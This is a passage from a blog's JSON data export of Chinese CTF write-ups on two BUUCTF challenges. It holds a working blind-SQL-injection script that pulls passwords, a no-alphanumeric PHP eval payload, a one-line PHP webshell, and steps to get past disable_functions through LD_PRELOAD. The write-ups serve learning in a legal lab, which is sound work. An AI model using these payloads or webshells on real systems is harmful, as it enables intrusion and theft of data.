32\n\tmid = (low + high) // 2\n\twhile high>low:\n\t\t# sql=\"(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)\"%(i,c)\n\t\t# sql = \"(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)\" % (x, mid)\n\t\tsql = \"(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))>%d)\" % (x, mid)\n\t\ttime.sleep(0.1)\n\t\treponse=requests.get(url+sql)\n\t\tif \"Click\" in reponse.text:\n\t\t\tlow=mid+1\n\t\telse:\n\t\t\thigh = mid\n\t\tmid = (low+high)/2\n\n\tresult += chr(int(mid))\n\tprint(result)\n\n```\n\n我是直接使用了判断字符的返回值1或0作为id的参数，因为使用**group_concat**拼接时字符串有逗号`,`所以字符ascii需要至少从44开始。\n\n下面是查询到的两个表F1naI1y 、Flaaaaag及结构\n\n> F1naI1y  ====>  id,username,password\n>\n> Flaaaaag  ====> id,fl4gawsl\n\n在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag\n\n","source":"_posts/[极客大挑战 2019]FinalSQL.md","raw":"---\ntitle: 极客大挑战 2019 FinalSQL\ndate: 2021-04-18 19:11:51\ncategories: \n- CTF \ntags: \n- sql注入\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232228.png\n---\n\n还是同一场比赛的界面\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416224503.png)\n\n这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：**你可别被我逮住了，臭弟弟**，测试上面的序号，注意此时的url中有`?id=`猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个**数字型**注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。\n\n发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。\n\n贴出来自己的脚本：\n\n```python\n# codeing=utf-8\nimport requests\nimport time\n\nurl='http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id='\nresult=''\n\nfor x in range(1, 100):\n\thigh = 127\n\tlow = 32\n\tmid = (low + high) // 2\n\twhile high>low:\n\t\t# sql=\"(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)\"%(i,c)\n\t\t# sql = \"(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)\" % (x, mid)\n\t\tsql = \"(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))>%d)\" % (x, mid)\n\t\ttime.sleep(0.1)\n\t\treponse=requests.get(url+sql)\n\t\tif \"Click\" in reponse.text:\n\t\t\tlow=mid+1\n\t\telse:\n\t\t\thigh = mid\n\t\tmid = (low+high)/2\n\n\tresult += chr(int(mid))\n\tprint(result)\n\n```\n\n我是直接使用了判断字符的返回值1或0作为id的参数，因为使用**group_concat**拼接时字符串有逗号`,`所以字符ascii需要至少从44开始。\n\n下面是查询到的两个表F1naI1y 、Flaaaaag及结构\n\n> F1naI1y  ====>  id,username,password\n>\n> Flaaaaag  ====> id,fl4gawsl\n\n在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag\n\n","slug":"[极客大挑战 2019]FinalSQL","published":1,"updated":"2021-12-30T09:42:54.200Z","_id":"ckrr3f9b30015hotcag1j4vmv","comments":1,"layout":"post","photos":[],"link":"","content":"<p>还是同一场比赛的界面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416224503.png\"></p>\n<p>这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：<strong>你可别被我逮住了，臭弟弟</strong>，测试上面的序号，注意此时的url中有<code>?id=</code>猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个<strong>数字型</strong>注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。</p>\n<p>发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。</p>\n<p>贴出来自己的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># codeing=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&#x27;</span></span><br><span class=\"line\">result=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100</span>):</span><br><span class=\"line\">\thigh = <span class=\"number\">127</span></span><br><span class=\"line\">\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> high&gt;low:</span><br><span class=\"line\">\t\t<span class=\"comment\"># sql=&quot;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&quot;%(i,c)</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># sql = &quot;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)&quot; % (x, mid)</span></span><br><span class=\"line\">\t\tsql = <span class=\"string\">&quot;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))&gt;%d)&quot;</span> % (x, mid)</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">\t\treponse=requests.get(url+sql)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;Click&quot;</span> <span class=\"keyword\">in</span> reponse.text:</span><br><span class=\"line\">\t\t\tlow=mid+<span class=\"number\">1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\thigh = mid</span><br><span class=\"line\">\t\tmid = (low+high)/<span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tresult += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(mid))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(result)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我是直接使用了判断字符的返回值1或0作为id的参数，因为使用<strong>group_concat</strong>拼接时字符串有逗号<code>,</code>所以字符ascii需要至少从44开始。</p>\n<p>下面是查询到的两个表F1naI1y 、Flaaaaag及结构</p>\n<blockquote>\n<p>F1naI1y  ====&gt;  id,username,password</p>\n<p>Flaaaaag  ====&gt; id,fl4gawsl</p>\n</blockquote>\n<p>在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag</p>\n","site":{"data":{}},"excerpt":"","more":"<p>还是同一场比赛的界面</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210416224503.png\"></p>\n<p>这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：<strong>你可别被我逮住了，臭弟弟</strong>，测试上面的序号，注意此时的url中有<code>?id=</code>猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个<strong>数字型</strong>注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。</p>\n<p>发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。</p>\n<p>贴出来自己的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># codeing=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&#x27;</span></span><br><span class=\"line\">result=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100</span>):</span><br><span class=\"line\">\thigh = <span class=\"number\">127</span></span><br><span class=\"line\">\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> high&gt;low:</span><br><span class=\"line\">\t\t<span class=\"comment\"># sql=&quot;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&quot;%(i,c)</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># sql = &quot;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)&quot; % (x, mid)</span></span><br><span class=\"line\">\t\tsql = <span class=\"string\">&quot;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))&gt;%d)&quot;</span> % (x, mid)</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">\t\treponse=requests.get(url+sql)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;Click&quot;</span> <span class=\"keyword\">in</span> reponse.text:</span><br><span class=\"line\">\t\t\tlow=mid+<span class=\"number\">1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\thigh = mid</span><br><span class=\"line\">\t\tmid = (low+high)/<span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tresult += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(mid))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(result)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我是直接使用了判断字符的返回值1或0作为id的参数，因为使用<strong>group_concat</strong>拼接时字符串有逗号<code>,</code>所以字符ascii需要至少从44开始。</p>\n<p>下面是查询到的两个表F1naI1y 、Flaaaaag及结构</p>\n<blockquote>\n<p>F1naI1y  ====&gt;  id,username,password</p>\n<p>Flaaaaag  ====&gt; id,fl4gawsl</p>\n</blockquote>\n<p>在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag</p>\n"},{"title":"极客大挑战 2019 RCE ME","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232544.png","date":"2020-12-05T12:42:00.000Z","_content":"\n# [极客大挑战 2019]RCE ME\n\n源码：\n\n```\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n分析一波，GET请求获得`code`，想要通过的话需要绕过两个检测：\n\n1. payload长度小于40\n2. 不能包含`a-z、A-Z、0-9`\n\n和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，这次摸到了相关文章：[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)。\n\n使用`url编码`+`~`取反构造不可见字符串，然后加上php7版本以后支持了使用：`($a)()`这样的方法动态执行函数，所以我们可以构造payload：`assert(eval($_POST[‘a’]))`\n\n先构造`assert`：\n\n```\necho urlencode(~'assert');\n\n//结果：%9E%8C%8C%9A%8D%8B\n```\n\n再构造`eval($_POST['a'])`：\n\n```\necho urlencode(~'eval($_POST[\\'a\\'])');\n\n//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6\n```\n\n完整payload：\n\n```\n?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);\n```\n\n网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的`~`取反再获得真正的函数名。\n\n使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是`ELF`是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回`ret=127`：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201403.png)\n\n搜索了一波，原来是是**disable_function**搞的鬼，这个表可以在phpinfo()中查看：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201821.png)\n\n因为`system`、`exec`、`shell_exec`等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过**disable_function**的方法，网上有很多其他方法，其中一个方法：\n\n**利用环境变量LD_PRELOAD来绕过**\n\n>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的\n>\n> \n>\n>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。\n\n正好蚁剑的插件中就有一个名为：[as_bypass_php_disable_functions](https://github.com/Medicean/as_bypass_php_disable_functions)的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234337.png)\n\n插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的`/var/www/html`目录是没有上传权限的，我右键以后发现能修改权限，改成0777：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204190508.png)\n\n>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。\n\n上传一句话木马233.php：\n\n```\n<?php\n@eval($_POST['b']);\n```\n\n再用一句话木马的shell执行插件：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204231514.png)\n\n进入shell，目录下面多了一个名为**\\.antproxy.php**的文件：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234445.png)\n\n再使用蚁剑连接**\\.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204233847.png)\n\nflag{a216900e-2427-48f7-9323-f65d0a3abdbf}\n\n","source":"_posts/[极客大挑战 2019]RCE ME.md","raw":"---\ntitle: 极客大挑战 2019 RCE ME\ncategories: \n- DROPS\ntags:\n- Web\n- BUUCTF_Web\n- RCE\n- disable_function绕过\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232544.png\ndate: 2020-12-5 20:42:00\n---\n\n# [极客大挑战 2019]RCE ME\n\n源码：\n\n```\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n分析一波，GET请求获得`code`，想要通过的话需要绕过两个检测：\n\n1. payload长度小于40\n2. 不能包含`a-z、A-Z、0-9`\n\n和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，这次摸到了相关文章：[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)。\n\n使用`url编码`+`~`取反构造不可见字符串，然后加上php7版本以后支持了使用：`($a)()`这样的方法动态执行函数，所以我们可以构造payload：`assert(eval($_POST[‘a’]))`\n\n先构造`assert`：\n\n```\necho urlencode(~'assert');\n\n//结果：%9E%8C%8C%9A%8D%8B\n```\n\n再构造`eval($_POST['a'])`：\n\n```\necho urlencode(~'eval($_POST[\\'a\\'])');\n\n//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6\n```\n\n完整payload：\n\n```\n?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);\n```\n\n网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的`~`取反再获得真正的函数名。\n\n使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是`ELF`是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回`ret=127`：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201403.png)\n\n搜索了一波，原来是是**disable_function**搞的鬼，这个表可以在phpinfo()中查看：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201821.png)\n\n因为`system`、`exec`、`shell_exec`等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过**disable_function**的方法，网上有很多其他方法，其中一个方法：\n\n**利用环境变量LD_PRELOAD来绕过**\n\n>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的\n>\n> \n>\n>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。\n\n正好蚁剑的插件中就有一个名为：[as_bypass_php_disable_functions](https://github.com/Medicean/as_bypass_php_disable_functions)的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234337.png)\n\n插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的`/var/www/html`目录是没有上传权限的，我右键以后发现能修改权限，改成0777：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204190508.png)\n\n>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。\n\n上传一句话木马233.php：\n\n```\n<?php\n@eval($_POST['b']);\n```\n\n再用一句话木马的shell执行插件：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204231514.png)\n\n进入shell，目录下面多了一个名为**\\.antproxy.php**的文件：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234445.png)\n\n再使用蚁剑连接**\\.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204233847.png)\n\nflag{a216900e-2427-48f7-9323-f65d0a3abdbf}\n\n","slug":"[极客大挑战 2019]RCE ME","published":1,"updated":"2021-12-30T09:42:54.201Z","_id":"ckrr3f9b40017hotcgdnng64b","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"极客大挑战-2019-RCE-ME\"><a href=\"#极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"[极客大挑战 2019]RCE ME\"></a>[极客大挑战 2019]RCE ME</h1><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">            $code=$_GET[&#x27;code&#x27;];</span><br><span class=\"line\">                    if(strlen($code)&gt;40)&#123;</span><br><span class=\"line\">                                        die(&quot;This is too Long.&quot;);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class=\"line\">                                        die(&quot;NO.&quot;);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    @eval($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">            highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>分析一波，GET请求获得<code>code</code>，想要通过的话需要绕过两个检测：</p>\n<ol>\n<li>payload长度小于40</li>\n<li>不能包含<code>a-z、A-Z、0-9</code></li>\n</ol>\n<p>和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\">一些不包含数字和字母的webshell</a>，这次摸到了相关文章：<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\">无字母数字webshell之提高篇</a>。</p>\n<p>使用<code>url编码</code>+<code>~</code>取反构造不可见字符串，然后加上php7版本以后支持了使用：<code>($a)()</code>这样的方法动态执行函数，所以我们可以构造payload：<code>assert(eval($_POST[‘a’]))</code></p>\n<p>先构造<code>assert</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo urlencode(~&#x27;assert&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">//结果：%9E%8C%8C%9A%8D%8B</span><br></pre></td></tr></table></figure>\n\n<p>再构造<code>eval($_POST[&#39;a&#39;])</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo urlencode(~&#x27;eval($_POST[\\&#x27;a\\&#x27;])&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6</span><br></pre></td></tr></table></figure>\n\n<p>完整payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);</span><br></pre></td></tr></table></figure>\n\n<p>网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的<code>~</code>取反再获得真正的函数名。</p>\n<p>使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是<code>ELF</code>是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回<code>ret=127</code>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201403.png\"></p>\n<p>搜索了一波，原来是是<strong>disable_function</strong>搞的鬼，这个表可以在phpinfo()中查看：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201821.png\"></p>\n<p>因为<code>system</code>、<code>exec</code>、<code>shell_exec</code>等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过<strong>disable_function</strong>的方法，网上有很多其他方法，其中一个方法：</p>\n<p><strong>利用环境变量LD_PRELOAD来绕过</strong></p>\n<blockquote>\n<p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的</p>\n<p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>\n</blockquote>\n<p>正好蚁剑的插件中就有一个名为：<a href=\"https://github.com/Medicean/as_bypass_php_disable_functions\">as_bypass_php_disable_functions</a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234337.png\"></p>\n<p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的<code>/var/www/html</code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204190508.png\"></p>\n<blockquote>\n<p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。</p>\n</blockquote>\n<p>上传一句话木马233.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;b&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>再用一句话木马的shell执行插件：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204231514.png\"></p>\n<p>进入shell，目录下面多了一个名为<strong>.antproxy.php</strong>的文件：</p>\n<p><img 